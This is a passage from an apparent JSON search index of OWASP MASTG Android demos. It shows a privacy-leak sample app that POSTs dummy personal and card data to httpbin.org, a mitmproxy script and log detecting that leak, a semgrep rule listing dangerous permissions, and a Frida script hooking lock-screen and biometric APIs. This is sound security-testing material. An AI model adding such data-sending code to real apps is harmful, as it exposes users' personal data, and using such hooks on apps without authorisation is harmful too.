java.util.Collection;\nimport java.util.List;\nimport java.util.Map;\nimport kotlin.Metadata;\nimport kotlin.TuplesKt;\nimport kotlin.collections.CollectionsKt;\nimport kotlin.collections.MapsKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.jvm.internal.Ref;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    /* JADX WARN: Multi-variable type inference failed */\n    public final String mastgTest() {\n        final Map SENSITIVE_DATA = MapsKt.mapOf(TuplesKt.to(\"precise_location_latitude\", \"37.7749\"), TuplesKt.to(\"precise_location_longitude\", \"-122.4194\"), TuplesKt.to(HintConstants.AUTOFILL_HINT_NAME, \"John Doe\"), TuplesKt.to(\"email_address\", \"john.doe@example.com\"), TuplesKt.to(\"phone_number\", \"+11234567890\"), TuplesKt.to(\"credit_card_number\", \"1234 5678 9012 3456\"));\n        final Ref.ObjectRef result = new Ref.ObjectRef();\n        result.element = \"\";\n        Thread thread = new Thread(new Runnable() { // from class: org.owasp.mastestapp.MastgTest$$ExternalSyntheticLambda0\n            @Override // java.lang.Runnable\n            public final void run() {\n                MastgTest.mastgTest$lambda$1(SENSITIVE_DATA, result);\n            }\n        });\n        thread.start();\n        thread.join();\n        return (String) result.element;\n    }\n\n    /* JADX INFO: Access modifiers changed from: private */\n    /* JADX WARN: Type inference failed for: r7v10, types: [T, java.lang.String] */\n    public static final void mastgTest$lambda$1(Map SENSITIVE_DATA, Ref.ObjectRef result) {\n        Intrinsics.checkNotNullParameter(SENSITIVE_DATA, \"$SENSITIVE_DATA\");\n        Intrinsics.checkNotNullParameter(result, \"$result\");\n        try {\n            URL url = new URL(\"https://httpbin.org/post\");\n            URLConnection openConnection = url.openConnection();\n            Intrinsics.checkNotNull(openConnection, \"null cannot be cast to non-null type java.net.HttpURLConnection\");\n            HttpURLConnection httpURLConnection = (HttpURLConnection) openConnection;\n            httpURLConnection.setRequestMethod(\"POST\");\n            httpURLConnection.setDoOutput(true);\n            httpURLConnection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            Collection destination$iv$iv = new ArrayList(SENSITIVE_DATA.size());\n            for (Map.Entry item$iv$iv : SENSITIVE_DATA.entrySet()) {\n                String key = (String) item$iv$iv.getKey();\n                String value = (String) item$iv$iv.getValue();\n                destination$iv$iv.add(URLEncoder.encode(key, \"UTF-8\") + '=' + URLEncoder.encode(value, \"UTF-8\"));\n                url = url;\n            }\n            String postData = CollectionsKt.joinToString$default((List) destination$iv$iv, \"&amp;\", null, null, 0, null, null, 62, null);\n            BufferedOutputStream outputStream = new BufferedOutputStream(httpURLConnection.getOutputStream());\n            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, \"UTF-8\"));\n            bufferedWriter.write(postData);\n            bufferedWriter.flush();\n            bufferedWriter.close();\n            outputStream.close();\n            int responseCode = httpURLConnection.getResponseCode();\n            if (responseCode == 200) {\n                Log.d(\"HTTP_SUCCESS\", \"Successfully authenticated.\");\n            } else {\n                Log.e(\"HTTP_ERROR\", \"Failed to authenticate. Response code: \" + responseCode);\n            }\n            result.element = responseCode + \"\\n\\n\" + postData;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0206"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0009/MASTG-DEMO-0009/#steps","title":"Steps","text":"<p>Start the device, in this case, the Android emulator:</p> <pre><code>emulator -avd Pixel_3a_API_33_arm64-v8a -writable-system\n</code></pre> <p>Run  mitmproxy with the custom script for logging sensitive data and dump the relevant traffic to a file.</p> <p>Note that the script is preconfigured with data that's already considered sensitive for this application. When running this test in a real-world scenario, you should determine what is considered sensitive data based on the app's privacy policy and relevant privacy regulations. One recommended way to do this is by checking the app's privacy policy and the App Store Privacy declarations.</p> mitm_sensitive_logger.py<pre><code>from mitmproxy import http\n\n# This data would come from another file and should be defined after identifying the data that is considered sensitive for this application.\n# For example by using the Google Play Store Data Safety section.\nSENSITIVE_DATA = {\n    \"precise_location_latitude\": \"37.7749\",\n    \"precise_location_longitude\": \"-122.4194\",\n    \"name\": \"John Doe\",\n    \"email_address\": \"john.doe@example.com\",\n    \"phone_number\": \"+11234567890\",\n    \"credit_card_number\": \"1234 5678 9012 3456\"\n}\n\nSENSITIVE_STRINGS = SENSITIVE_DATA.values()\n\ndef contains_sensitive_data(string):\n    return any(sensitive in string for sensitive in SENSITIVE_STRINGS)\n\ndef process_flow(flow):\n    url = flow.request.pretty_url\n    request_headers = flow.request.headers\n    request_body = flow.request.text\n    response_headers = flow.response.headers if flow.response else \"No response\"\n    response_body = flow.response.text if flow.response else \"No response\"\n\n    if (contains_sensitive_data(url) or \n        contains_sensitive_data(request_body) or \n        contains_sensitive_data(response_body)):\n        with open(\"sensitive_data.log\", \"a\") as file:\n            if flow.response:\n                file.write(f\"RESPONSE URL: {url}\\n\")\n                file.write(f\"Response Headers: {response_headers}\\n\")\n                file.write(f\"Response Body: {response_body}\\n\\n\")\n            else:\n                file.write(f\"REQUEST URL: {url}\\n\")\n                file.write(f\"Request Headers: {request_headers}\\n\")\n                file.write(f\"Request Body: {request_body}\\n\\n\")\ndef request(flow: http.HTTPFlow):\n    process_flow(flow)\n\ndef response(flow: http.HTTPFlow):\n    process_flow(flow)\n</code></pre> run.sh<pre><code>mitmdump -s mitm_sensitive_logger.py\n</code></pre> <p>Launch the app from Android Studio and click the button which will send the sensitive data over the network. The script will capture the network traffic and log the sensitive data.</p>","tags":["android","demo","MASTG-TEST-0206"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0009/MASTG-DEMO-0009/#observation","title":"Observation","text":"<p>The script has identified several instances of sensitive data in the network traffic.</p> <ul> <li>The first instance is a POST request to <code>https://httpbin.org/post</code> which contains the sensitive data values in the request body.</li> <li>The second instance is a response from <code>https://httpbin.org/post</code> which contains the sensitive data values in the response body.</li> </ul> sensitive_data.log<pre><code>REQUEST URL: https://httpbin.org/post\nRequest Headers: Headers[(b'Content-Type', b'application/x-www-form-urlencoded'), (b'User-Agent', b'Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_arm64 Build/TE1A.220922.021)'), (b'Host', b'httpbin.org'), (b'Connection', b'Keep-Alive'), (b'Accept-Encoding', b'gzip'), (b'Content-Length', b'188')]\nRequest Body: precise_location_latitude=37.7749&amp;precise_location_longitude=-122.4194&amp;name=John+Doe&amp;email_address=john.doe%40example.com&amp;phone_number=%2B11234567890&amp;credit_card_number=1234+5678+9012+3456\n\nRESPONSE URL: https://httpbin.org/post\nResponse Headers: Headers[(b'Date', b'Fri, 19 Jan 2024 10:17:44 GMT'), (b'Content-Type', b'application/json'), (b'Content-Length', b'735'), (b'Connection', b'keep-alive'), (b'Server', b'gunicorn/19.9.0'), (b'Access-Control-Allow-Origin', b'*'), (b'Access-Control-Allow-Credentials', b'true')]\nResponse Body: {\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"credit_card_number\": \"1234 5678 9012 3456\", \n    \"email_address\": \"john.doe@example.com\", \n    \"name\": \"John Doe\", \n    \"phone_number\": \"+11234567890\", \n    \"precise_location_latitude\": \"37.7749\", \n    \"precise_location_longitude\": \"-122.4194\"\n  }, \n  \"headers\": {\n    \"Accept-Encoding\": \"gzip\", \n    \"Content-Length\": \"188\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_arm64 Build/TE1A.220922.021)\", \n    \"X-Amzn-Trace-Id\": \"Root=1-65aa4c48-45514c0e3782665063b14397\"\n  }, \n  \"json\": null, \n  \"origin\": \"148.141.65.87\", \n  \"url\": \"https://httpbin.org/post\"\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0206"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0009/MASTG-DEMO-0009/#evaluation","title":"Evaluation","text":"<p>After reviewing the captured network traffic, we can conclude that the test fails because the sensitive data is sent over the network.</p> <p>This is a dummy example, but in a real-world scenario, you should determine which of the reported instances are privacy-relevant and need to be addressed.</p> <p>Note that both the request and the response are encrypted using TLS, so they can be considered secure. However, this might represent a privacy issue depending on the relevant privacy regulations and the app's privacy policy. You should now check the privacy policy and the App Store Privacy declarations to see if the app is allowed to send this data to a third-party.</p>","tags":["android","demo","MASTG-TEST-0206"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0033/MASTG-DEMO-0033/","title":"MASTG-DEMO-0033: Dangerous Permissions in the AndroidManifest with semgrep","text":"<p>  Download MASTG-DEMO-0033 APK   Open MASTG-DEMO-0033 Folder  Build MASTG-DEMO-0033 APK</p>","tags":["android","demo","MASTG-TEST-0254"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0033/MASTG-DEMO-0033/#sample","title":"Sample","text":"<p>The following is a sample AndroidManifest file that declares 4 dangerous permissions.</p> AndroidManifest.xmlAndroidManifest_reversed.xml <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_CONTACTS\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"34\" android:compileSdkVersionCodename=\"14\" package=\"org.owasp.mastestapp\" platformBuildVersionCode=\"34\" platformBuildVersionName=\"14\"&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_CONTACTS\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/&gt;\n    &lt;permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\" android:protectionLevel=\"signature\"/&gt;\n    &lt;uses-permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"/&gt;\n    &lt;application android:allowBackup=\"true\" android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\" android:dataExtractionRules=\"@xml/data_extraction_rules\" android:debuggable=\"true\" android:extractNativeLibs=\"false\" android:fullBackupContent=\"@xml/backup_rules\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:theme=\"@style/Theme.MASTestApp\"&gt;\n        &lt;activity android:exported=\"true\" android:name=\"org.owasp.mastestapp.MainActivity\" android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.compose.ui.tooling.PreviewActivity\"/&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.activity.ComponentActivity\"/&gt;\n        &lt;provider android:authorities=\"org.owasp.mastestapp.androidx-startup\" android:exported=\"false\" android:name=\"androidx.startup.InitializationProvider\"&gt;\n            &lt;meta-data android:name=\"androidx.emoji2.text.EmojiCompatInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.lifecycle.ProcessLifecycleInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.profileinstaller.ProfileInstallerInitializer\" android:value=\"androidx.startup\"/&gt;\n        &lt;/provider&gt;\n        &lt;receiver android:directBootAware=\"false\" android:enabled=\"true\" android:exported=\"true\" android:name=\"androidx.profileinstaller.ProfileInstallReceiver\" android:permission=\"android.permission.DUMP\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.INSTALL_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SKIP_FILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SAVE_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.BENCHMARK_OPERATION\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/receiver&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0254"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0033/MASTG-DEMO-0033/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample manifest file.</p> ../../../../rules/mastg-android-dangerous-app-permissions.yaml<pre><code>rules:\n  - id: detect-dangerous-android-permissions\n    languages:\n      - xml\n    message: \"Dangerous Android permission found:\"\n    severity: WARNING\n    pattern-either:\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_CONTACTS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_CALENDAR\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.WRITE_CALENDAR\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.SEND_SMS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.RECEIVE_SMS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_SMS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.RECEIVE_WAP_PUSH\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.RECEIVE_MMS\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.READ_CELL_BROADCASTS\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_MEDIA_AUDIO\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_MEDIA_VIDEO\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_MEDIA_IMAGES\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.READ_MEDIA_VISUAL_USER_SELECTED\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.ACCESS_MEDIA_LOCATION\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.ACCESS_FINE_LOCATION\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.ACCESS_BACKGROUND_LOCATION\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_CALL_LOG\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.PROCESS_OUTGOING_CALLS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.READ_PHONE_NUMBERS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.CALL_PHONE\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"com.android.voicemail.permission.ADD_VOICEMAIL\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.USE_SIP\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.ANSWER_PHONE_CALLS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.ACCEPT_HANDOVER\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.RECORD_AUDIO\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.ACTIVITY_RECOGNITION\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.CAMERA\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.BODY_SENSORS\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.BODY_SENSORS_BACKGROUND\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.POST_NOTIFICATIONS\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.BLUETOOTH_SCAN\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.BLUETOOTH_CONNECT\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.BLUETOOTH_ADVERTISE\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.UWB_RANGING\"/&gt;\n      - pattern: &lt;uses-permission\n          android:name=\"android.permission.NEARBY_WIFI_DEVICES\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.RANGING\"/&gt;\n      - pattern: &lt;uses-permission android:name=\"android.permission.GET_ACCOUNTS\"/&gt;\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-dangerous-app-permissions.yaml ./AndroidManifest_reversed.xml &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0254"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0033/MASTG-DEMO-0033/#observation","title":"Observation","text":"<p>The rule has identified four instances in the AndroidManifest file where the app declares dangerous permissions.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 4 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    AndroidManifest_reversed.xml\n    \u276f\u2771 rules.detect-dangerous-android-permissions\n          Dangerous Android permission found:\n\n            3\u2506 &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt;\n            \u22ee\u2506----------------------------------------\n            4\u2506 &lt;uses-permission android:name=\"android.permission.READ_CONTACTS\"/&gt;\n            \u22ee\u2506----------------------------------------\n            5\u2506 &lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/&gt;\n            \u22ee\u2506----------------------------------------\n            6\u2506 &lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0254"]},{"location":"MASTG/demos/android/MASVS-PRIVACY/MASTG-DEMO-0033/MASTG-DEMO-0033/#evaluation","title":"Evaluation","text":"<p>The test fails because the app declares the following dangerous permissions:</p> <ul> <li><code>WRITE_EXTERNAL_STORAGE</code></li> <li><code>READ_CONTACTS</code></li> <li><code>READ_EXTERNAL_STORAGE</code></li> <li><code>ACCESS_FINE_LOCATION</code></li> </ul>","tags":["android","demo","MASTG-TEST-0254"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0027/MASTG-DEMO-0027/","title":"MASTG-DEMO-0027: Runtime Use of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate APIs with Frida","text":"<p>  Download MASTG-DEMO-0027 APK   Open MASTG-DEMO-0027 Folder  Build MASTG-DEMO-0027 APK</p>","tags":["android","demo","MASTG-TEST-0249"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0027/MASTG-DEMO-0027/#sample","title":"Sample","text":"<p>This sample checks if the device has a secure lock screen via <code>KeyguardManager.isDeviceSecure</code> and if the device supports strong biometric authentication using <code>BiometricManager.canAuthenticate</code>.</p> MastgTest.kt<pre><code>package org.owasp.mastestapp\n\nimport android.app.KeyguardManager\nimport android.content.Context\nimport android.hardware.biometrics.BiometricManager\nimport android.os.Build\n\nclass MastgTest(private val context: Context) {\n    fun mastgTest(): String {\n        val isLocked = isDeviceSecure(context)\n        val biometricStatus = checkStrongBiometricStatus()\n        return \"Device has a passcode: $isLocked\\n\\n\" +\n                \"Biometric status: $biometricStatus\"\n    }\n\n    /**\n     * Checks if the device has a secure lock screen (e.g., PIN, pattern, password).\n     *\n     * @return `true` if the device has a secure lock screen, `false` otherwise.\n     */\n\n    fun isDeviceSecure(context: Context): Boolean {\n        val keyguardManager = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager\n        return keyguardManager.isDeviceSecure\n    }\n\n    /**\n     * Checks if the device supports strong biometric authentication (e.g., fingerprint, face, iris)\n     * and if the user has enrolled biometric credentials.\n     *\n     * **Note:** This API is available on API level 30 (Android R) and above.\n     *\n     * @return A human-readable string describing the biometric status.\n     */\n    fun checkStrongBiometricStatus(): String {\n        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.R) {\n            val biometricManager = context.getSystemService(BiometricManager::class.java)\n            val result = biometricManager.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_STRONG)\n            return when (result) {\n                BiometricManager.BIOMETRIC_SUCCESS -&gt;\n                    \"BIOMETRIC_SUCCESS - Strong biometric authentication is available.\"\n                BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -&gt;\n                    \"BIOMETRIC_ERROR_NO_HARDWARE - No biometric hardware available.\"\n                BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -&gt;\n                    \"BIOMETRIC_ERROR_HW_UNAVAILABLE - Biometric hardware is currently unavailable.\"\n                BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -&gt;\n                    \"BIOMETRIC_ERROR_NONE_ENROLLED - No biometrics enrolled.\"\n                else -&gt;\n                    \"Unknown biometric status: $result\"\n            }\n        } else {\n            return \"Strong biometric authentication check is not supported on this API level.\"\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0249"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0027/MASTG-DEMO-0027/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for Android installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn the app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code></li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp -l ./script.js -o output.txt\n</code></pre> <pre><code>Java.perform(() =&gt; {\n\n  // Function to print backtrace with a configurable number of lines (default: 5)\n  function printBacktrace(maxLines = 8) {\n      let Exception = Java.use(\"java.lang.Exception\");\n      let stackTrace = Exception.$new().getStackTrace().toString().split(\",\");\n\n      console.log(\"\\nBacktrace:\");\n      for (let i = 0; i &lt; Math.min(maxLines, stackTrace.length); i++) {\n          console.log(stackTrace[i]);\n      }\n  }\n\n  // Hook KeyguardManager.isDeviceSecure()\n  let KeyguardManager = Java.use(\"android.app.KeyguardManager\");\n\n  KeyguardManager[\"isDeviceSecure\"].overload().implementation = function () {\n\n      let result = this[\"isDeviceSecure\"]();\n      console.log(`\\n\\n[*] KeyguardManager.isDeviceSecure() called - RESULT: ${result}\\n`);\n\n      // Java stack trace\n      printBacktrace();\n\n      return result;\n  };\n\n  // Hook BiometricManager.canAuthenticate()\n  const BiometricManager = Java.use(\"android.hardware.biometrics.BiometricManager\");\n  const Authenticators = Java.use(\"android.hardware.biometrics.BiometricManager$Authenticators\");\n\n  // Cache original implementation\n  const originalCanAuth = BiometricManager.canAuthenticate.overload(\"int\");\n\n  // Map flag values to names\n  const flagNames = {\n    [Authenticators.BIOMETRIC_WEAK.value]: \"BIOMETRIC_WEAK\",\n    [Authenticators.BIOMETRIC_STRONG.value]: \"BIOMETRIC_STRONG\",\n    [Authenticators.DEVICE_CREDENTIAL.value]: \"DEVICE_CREDENTIAL\"\n  };\n\n  // Map result codes to messages\n  const resultMessages = {\n    [BiometricManager.BIOMETRIC_SUCCESS.value]: \"BIOMETRIC_SUCCESS\",\n    [BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE.value]: \"BIOMETRIC_ERROR_NO_HARDWARE\",\n    [BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE.value]: \"BIOMETRIC_ERROR_HW_UNAVAILABLE\",\n    [BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED.value]: \"BIOMETRIC_ERROR_NONE_ENROLLED\"\n  };\n\n  originalCanAuth.implementation = function (authenticators) {\n    // Build readable authenticators string\n    const names = Object.keys(flagNames)\n      .map(key =&gt; parseInt(key, 10))\n      .filter(key =&gt; (authenticators &amp; key) === key)\n      .map(key =&gt; flagNames[key]);\n    const readable = names.length ? names.join(\" | \") : \"NONE\";\n\n    // Call original\n    const res = originalCanAuth.call(this, authenticators);\n\n    // Lookup result message\n    const msg = resultMessages[res] || `Unknown biometric status: ${res}`;\n\n    console.log(`\\n\\n[*] BiometricManager.canAuthenticate called with: ${readable} (${authenticators}) - RESULT: ${msg} (${res})`);\n\n    printBacktrace();\n\n    return res;\n  };\n});\n</code></pre>","tags":["android","demo","MASTG-TEST-0249"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0027/MASTG-DEMO-0027/#observation","title":"Observation","text":"<p>The output reveals the use of <code>KeyguardManager.isDeviceSecure</code> and <code>BiometricManager.canAuthenticate</code>.</p> output.txt<pre><code>[*] KeyguardManager.isDeviceSecure() called - RESULT: false\n\n\nBacktrace:\nandroid.app.KeyguardManager.isDeviceSecure(Native Method)\norg.owasp.mastestapp.MastgTest.isDeviceSecure(MastgTest.kt:24)\norg.owasp.mastestapp.MastgTest.mastgTest(MastgTest.kt:10)\norg.owasp.mastestapp.MainActivityKt.MainScreen$lambda$9$lambda$8(MainActivity.kt:53)\norg.owasp.mastestapp.MainActivityKt.$r8$lambda$PhzGLzmkS_ibruOfiTT32AhzWl4(Unknown Source:0)\norg.owasp.mastestapp.MainActivityKt$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)\njava.lang.Thread.run(Thread.java:1012)\n\n\n[*] BiometricManager.canAuthenticate called with: BIOMETRIC_STRONG (15) - RESULT: BIOMETRIC_ERROR_NONE_ENROLLED (11)\n\nBacktrace:\nandroid.hardware.biometrics.BiometricManager.canAuthenticate(Native Method)\norg.owasp.mastestapp.MastgTest.checkStrongBiometricStatus(MastgTest.kt:38)\norg.owasp.mastestapp.MastgTest.mastgTest(MastgTest.kt:11)\norg.owasp.mastestapp.MainActivityKt.MainScreen$lambda$9$lambda$8(MainActivity.kt:53)\norg.owasp.mastestapp.MainActivityKt.$r8$lambda$PhzGLzmkS_ibruOfiTT32AhzWl4(Unknown Source:0)\norg.owasp.mastestapp.MainActivityKt$$ExternalSyntheticLambda0.run(D8$$SyntheticClass:0)\njava.lang.Thread.run(Thread.java:1012)\n</code></pre>","tags":["android","demo","MASTG-TEST-0249"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0027/MASTG-DEMO-0027/#evaluation","title":"Evaluation","text":"<p>The test passes because the output 